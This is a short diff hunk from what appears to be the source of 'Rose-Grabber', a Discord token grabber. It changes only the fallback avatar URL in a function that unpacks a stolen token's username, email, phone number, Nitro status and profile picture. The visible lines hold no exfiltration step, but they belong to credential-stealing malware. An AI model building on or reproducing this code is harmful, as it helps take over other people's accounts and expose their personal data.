@@ -2823,7 +2823,7 @@ class DiscordX():
         username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
 
         if pfp is None:
-            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/assets/dogg.png"
+            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
         else:
             pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
